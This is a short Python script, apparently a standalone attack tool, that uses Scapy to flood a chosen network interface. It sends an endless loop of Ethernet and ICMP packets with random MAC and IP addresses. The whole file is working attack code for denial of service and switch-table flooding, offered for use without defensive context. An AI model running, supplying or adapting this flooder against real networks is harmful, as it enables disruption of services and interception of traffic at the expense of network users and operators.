#!/usr/bin/env python3

#by C0ldheim

#Import Scapy
from scapy.all import *
from scapy.contrib.icmp_extensions import *
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="iface", help="Choose the interface to attack")
    options = parser.parse_args()
    if not options.iface:
        parser.error ("Please, specify the interface")
    return options


def killnetwork(iface):
    death_packet = Ether(src=RandMAC(), dst=RandMAC())
    death_packet /= IP(src=RandIP(), dst=RandIP())
    death_packet /= ICMP()
    sendp(death_packet, iface=options.iface, loop=1, verbose=1)


options = get_arguments()
killnetwork(options.iface)
